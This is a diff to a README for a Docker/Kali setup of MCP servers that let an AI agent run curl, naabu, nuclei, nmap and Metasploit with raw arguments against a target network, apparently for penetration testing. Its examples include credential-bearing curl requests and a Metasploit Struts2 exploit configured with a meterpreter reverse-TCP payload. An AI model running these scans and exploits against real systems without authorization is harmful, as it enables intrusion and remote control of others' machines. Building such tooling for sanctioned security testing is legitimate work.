@@ -15,10 +15,10 @@ mcp/
 ├── servers/
 │   ├── __init__.py
 │   ├── run_servers.py     # Server launcher
-│   ├── naabu_server.py    # Port scanning (dynamic)
-│   ├── nuclei_server.py   # Vuln scanning (dynamic)
-│   ├── curl_server.py     # HTTP client (dynamic)
-│   └── metasploit_server.py  # Exploitation (structured)
+│   ├── network_recon_server.py  # HTTP client + port scanning (dynamic)
+│   ├── nuclei_server.py         # Vuln scanning (dynamic)
+│   ├── nmap_server.py           # Network mapper (dynamic)
+│   └── metasploit_server.py     # Exploitation (structured)
 ├── output/                # Scan results
 └── nuclei-templates/      # Custom nuclei templates (optional)
 ```
@@ -30,9 +30,9 @@ HOST (your machine)                              DOCKER CONTAINER (Kali Linux)
 ───────────────────                              ─────────────────────────────
 
 mcp/servers/                      ──VOLUME──>    /opt/mcp_servers/
-├── naabu_server.py               (hot reload)   ├── naabu_server.py
+├── network_recon_server.py       (hot reload)   ├── network_recon_server.py
 ├── nuclei_server.py                             ├── nuclei_server.py
-├── curl_server.py                               ├── curl_server.py
+├── nmap_server.py                               ├── nmap_server.py
 ├── metasploit_server.py                         ├── metasploit_server.py
 └── run_servers.py                               └── run_servers.py
                                                           │
@@ -47,15 +47,16 @@ mcp/requirements.txt              ──COPY──>      /tmp/requirements.txt
                                          ┌───────────────┼───────────────┐
                                          │               │               │
                                          ▼               ▼               ▼
-                                    Process 1       Process 2       Process 3 ...
-                                         │               │               │
-                                         ▼               ▼               ▼
-                                    :8000           :8001           :8002       :8003
-                                    naabu           curl            nuclei      metasploit
-                                         │               │               │           │
-                                         ▼               ▼               ▼           ▼
-                                    /usr/bin/      /usr/bin/      /root/go/bin/ msfconsole
-                                    naabu          curl           nuclei
+                                    Process 1       Process 2       Process 3  Process 4
+                                         │               │               │         │
+                                         ▼               ▼               ▼         ▼
+                                    :8000           :8002           :8003      :8004
+                                  network_recon     nuclei       metasploit    nmap
+                                  (curl + naabu)                               │
+                                         │               │           │         ▼
+                                         ▼               ▼           ▼     /usr/bin/
+                                    /usr/bin/      /root/go/bin/  msfconsole   nmap
+                                  curl + naabu      nuclei
 ```
 
 ### Environment Variables
@@ -66,10 +67,10 @@ These variables are set in `docker-compose.yml` and passed to the container:
 |----------|-------|-------------|
 | `MCP_TRANSPORT` | `sse` | Transport mode: `stdio` (direct) or `sse` (network) |
 | `MCP_HOST` | `0.0.0.0` | Host to bind servers (`0.0.0.0` = all interfaces) |
-| `NAABU_PORT` | `8000` | Port scanner server |
-| `CURL_PORT` | `8001` | HTTP client server |
+| `NETWORK_RECON_PORT` | `8000` | HTTP client + port scanner server |
 | `NUCLEI_PORT` | `8002` | Vulnerability scanner server |
 | `METASPLOIT_PORT` | `8003` | Exploitation framework server |
+| `NMAP_PORT` | `8004` | Network mapper server |
 | `MSF_PROGRESS_PORT` | `8013` | Metasploit progress streaming endpoint |
 | `MSF_RUN_TIMEOUT` | `1800` | Total timeout for `run` commands (30 min) |
 | `MSF_RUN_QUIET_PERIOD` | `120` | Quiet period for `run` commands (2 min) |
@@ -85,39 +86,40 @@ AI Agent (Claude/LangGraph)
          │
          │ MCP Protocol (JSON-RPC over SSE)
          ▼
-┌────────────────────────────────────────────────────────────────┐
-│                    KALI CONTAINER                               │
-│                                                                 │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
-│  │ naabu_server │  │ nuclei_server│  │    msf_server        │  │
-│  │   :8000      │  │    :8002     │  │    :8003 (MCP)       │  │
-│  └──────┬───────┘  └──────┬───────┘  │    :8013 (progress)  │  │
-│         │                 │          └──────────┬───────────┘  │
-│         │                 │                     │              │
-│         ▼                 ▼                     ▼              │
-│  subprocess.run()   subprocess.run()    PersistentMsfConsole   │
-│         │                 │              (singleton, shared)   │
-│         ▼                 ▼                     │              │
-│    /root/go/bin/    /root/go/bin/         msfconsole          │
-│       naabu            nuclei                                  │
-│         │                 │                     │              │
-└─────────┼─────────────────┼─────────────────────┼──────────────┘
-          │                 │                     │
-          ▼                 ▼                     ▼
-    ┌─────────────────────────────────────────────────┐
-    │              TARGET NETWORK                      │
-    │               10.0.0.0/24                        │
-    └─────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                              KALI CONTAINER                                   │
+│                                                                               │
+│  ┌───────────────────┐  ┌──────────────┐  ┌──────────┐  ┌────────────────┐  │
+│  │ network_recon     │  │ nuclei_server│  │nmap_server│  │  msf_server    │  │
+│  │   :8000           │  │    :8002     │  │   :8004   │  │  :8003 (MCP)   │  │
+│  │ (curl + naabu)    │  └──────┬───────┘  └─────┬─────┘  │  :8013 (prog.) │  │
+│  └────────┬──────────┘         │                │        └───────┬────────┘  │
+│           │                    │                │                │            │
+│           ▼                    ▼                ▼                ▼            │
+│    subprocess.run()    subprocess.run()   subprocess.run()  PersistentMsf    │
+│     (curl / naabu)                                         (singleton)       │
+│           │                    │                │                │            │
+│           ▼                    ▼                ▼                ▼            │
+│      /usr/bin/           /root/go/bin/     /usr/bin/        msfconsole       │
+│    curl + naabu            nuclei            nmap                            │
+│           │                    │                │                │            │
+└───────────┼────────────────────┼────────────────┼────────────────┼────────────┘
+            │                    │                │                │
+            ▼                    ▼                ▼                ▼
+      ┌─────────────────────────────────────────────────────────────┐
+      │                    TARGET NETWORK                            │
+      │                     10.0.0.0/24                              │
+      └─────────────────────────────────────────────────────────────┘
 ```
 
 ### Tool Design Philosophy
 
 | Server | Approach | Tools | Rationale |
 |--------|----------|-------|-----------|
-| naabu | Dynamic CLI | `execute_naabu(args)`, `naabu_help()` | Simple CLI, LLM knows flags |
-| nuclei | Dynamic CLI | `execute_nuclei(args)`, `nuclei_help()` | Many templates/options |
-| curl | Dynamic CLI | `execute_curl(args)`, `curl_help()` | Countless flags, LLM expertise |
-| metasploit | Structured | 7 specific tools | Stateful, sessions, complex workflows |
+| network_recon | Dynamic CLI | `execute_curl(args)`, `execute_naabu(args)` | Simple CLIs, LLM knows flags |
+| nuclei | Dynamic CLI | `execute_nuclei(args)` | Many templates/options |
+| nmap | Dynamic CLI | `execute_nmap(args)` | Countless flags, LLM expertise |
+| metasploit | Structured | `metasploit_console(command)`, `msf_restart()` | Stateful, sessions, complex workflows |
 
 **Dynamic CLI**: Pass raw command-line arguments. Maximum flexibility, trusts LLM knowledge.
 
@@ -155,51 +157,65 @@ python mcp/test_mcp.py https://testphp.vulnweb.com
 ### 3. Connect AI Agent
 
 The MCP servers are available at:
-- **naabu**: `http://localhost:8000` (port scanning)
-- **curl**: `http://localhost:8001` (HTTP requests)
+- **network_recon**: `http://localhost:8000` (HTTP requests + port scanning)
 - **nuclei**: `http://localhost:8002` (vulnerability scanning)
 - **metasploit**: `http://localhost:8003` (exploitation)
+- **nmap**: `http://localhost:8004` (service detection, OS fingerprinting, NSE scripts)
 - **metasploit progress**: `http://localhost:8013/progress` (live progress for long-running commands)
 
 ## Available Tools
 
-### Naabu Server (Port 8000)
+### Network Recon Server (Port 8000)
+
+Combined HTTP client and port scanner in a single server.
 
 | Tool | Description |
 |------|-------------|
-| `execute_naabu(args)` | Run naabu with any CLI arguments |
-| `naabu_help()` | Get naabu usage information |
+| `execute_curl(args)` | Run curl with any CLI arguments (60s timeout) |
+| `execute_naabu(args)` | Run naabu with any CLI arguments (300s timeout) |
 
-**Examples:**
+**Curl Examples:**
+```python
+execute_curl("-s -i http://10.0.0.5/")
+execute_curl("-s -X POST -d 'user=admin' http://10.0.0.5/login")
+execute_curl("-s -k https://10.0.0.5/")
+execute_curl("-s -i -u admin:password http://10.0.0.5/admin")
+```
+
+**Naabu Examples:**
 ```python
 execute_naabu("-host 10.0.0.5 -p 1-1000 -json")
 execute_naabu("-host 10.0.0.5 -top-ports 100 -nmap-cli 'nmap -sV'")
+execute_naabu("-host 10.0.0.5 -p 21,22,80,443,3306,8080 -json")
 ```
 
 ### Nuclei Server (Port 8002)
 
 | Tool | Description |
 |------|-------------|
-| `execute_nuclei(args)` | Run nuclei with any CLI arguments |
-| `nuclei_help()` | Get nuclei usage information |
+| `execute_nuclei(args)` | Run nuclei with any CLI arguments (600s timeout) |
 
 **Examples:**
 ```python
 execute_nuclei("-u http://10.0.0.5 -severity critical,high -jsonl")
 execute_nuclei("-u http://10.0.0.5 -id CVE-2021-41773 -jsonl")
+execute_nuclei("-u http://10.0.0.5 -tags xss,sqli -jsonl")
 ```
 
-### Curl Server (Port 8001)
+### Nmap Server (Port 8004)
 
 | Tool | Description |
 |------|-------------|
-| `execute_curl(args)` | Run curl with any CLI arguments |
-| `curl_help()` | Get curl usage information |
+| `execute_nmap(args)` | Run nmap with any CLI arguments (600s timeout) |
 
 **Examples:**
 ```python
-execute_curl("-s -i http://10.0.0.5/")
-execute_curl("-s -X POST -d 'user=admin' http://10.0.0.5/login")
+execute_nmap("-sV 10.0.0.5 -p 80,443")
+execute_nmap("-A 10.0.0.5 -p 22,80")
+execute_nmap("-sV --script vuln 10.0.0.5")
+execute_nmap("-O 10.0.0.5")
+execute_nmap("--script http-enum 10.0.0.5 -p 80")
+execute_nmap("-sU 10.0.0.5 --top-ports 20")
 ```
 
 ### Metasploit Server (Port 8003)
@@ -208,13 +224,8 @@ execute_curl("-s -X POST -d 'user=admin' http://10.0.0.5/login")
 |------|-------------|
 | `metasploit_console(command)` | Execute any msfconsole command (stateful) |
 | `msf_restart()` | Restart msfconsole for a clean state (internal) |
-| `metasploit_search(query)` | Search for modules |
-| `metasploit_info(module_name)` | Get module details |
-| `metasploit_module_payloads(module_name)` | List compatible payloads |
-| `metasploit_payload_info(payload_name)` | Get payload details |
-| `metasploit_exploit(...)` | Execute an exploit |
-| `metasploit_sessions()` | List active sessions |
-| `metasploit_session_interact(session_id, command)` | Run commands on session |
+
+The `metasploit_console` tool maintains a **single persistent msfconsole process** — module configurations, sessions, and variables persist across calls. Context-aware timeouts automatically adjust based on command type (`run`, `exploit`, or other).
 
 #### Automatic Session Reset
 
@@ -227,15 +238,11 @@ This happens transparently - the LLM agent doesn't need to call `msf_restart()` 
 
 **Examples:**
 ```python
-metasploit_search("CVE-2017-5638")
-metasploit_exploit(
-    module="multi/http/struts2_content_type_ognl",
-    rhosts="10.0.0.5",
-    rport=8080,
-    payload="linux/x64/meterpreter/reverse_tcp",
-    lhost="10.0.0.10",
-    lport=4444
-)
+metasploit_console("search CVE-2017-5638")
+metasploit_console("use exploit/multi/http/struts2_content_type_ognl")
+metasploit_console("set RHOSTS 10.0.0.5; set RPORT 8080; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.10; set LPORT 4444; exploit")
+metasploit_console("sessions -l")
+metasploit_console("sessions -i 1")
 ```
 
 ## Progress Streaming for Long-Running Commands
@@ -311,7 +318,7 @@ Metasploit uses quiet-period detection to determine when a command finishes. Whe
 |--------------|---------|--------------|----------|
 | `run` | 30 min | 2 min | Brute force attacks (many attempts) |
 | `exploit` | 10 min | 2 min | CVE exploits (staged payloads) |
-| Other | 2 min | 3 sec | Search, info, sessions, etc. |
+| Other | 3 min | 5 sec | Search, info, sessions, etc. |
 
 These values can be tuned via environment variables (see Environment Variables section).
 
@@ -321,7 +328,7 @@ These values can be tuned via environment variables (see Environment Variables s
 
 ```bash
 cd mcp/servers
-python run_servers.py --server naabu --stdio
+python run_servers.py --server network_recon --stdio
 ```
 
 ### SSE Mode (All Servers)
@@ -340,15 +347,18 @@ All configuration is hardcoded in `docker-compose.yml`:
 environment:
   - MCP_TRANSPORT=sse
   - MCP_HOST=0.0.0.0
-  - NAABU_PORT=8000
-  - CURL_PORT=8001
+  - NETWORK_RECON_PORT=8000
   - NUCLEI_PORT=8002
   - METASPLOIT_PORT=8003
+  - NMAP_PORT=8004
   - MSF_PROGRESS_PORT=8013
 
 ports:
-  - "8000-8003:8000-8003"
-  - "8013:8013"  # Metasploit progress endpoint
+  - "8000:8000"   # network_recon (curl + naabu)
+  - "8002:8002"   # nuclei
+  - "8003:8003"   # metasploit
+  - "8004:8004"   # nmap
+  - "8013:8013"   # metasploit progress endpoint
 ```
 
 To change ports or settings, edit `docker-compose.yml` directly.
@@ -365,17 +375,17 @@ Add to your Claude Code MCP configuration:
 ```json
 {
   "mcpServers": {
-    "naabu": {
+    "network_recon": {
       "url": "http://localhost:8000"
     },
     "nuclei": {
       "url": "http://localhost:8002"
     },
-    "curl": {
-      "url": "http://localhost:8001"
-    },
     "metasploit": {
       "url": "http://localhost:8003"
+    },
+    "nmap": {
+      "url": "http://localhost:8004"
     }
   }
 }
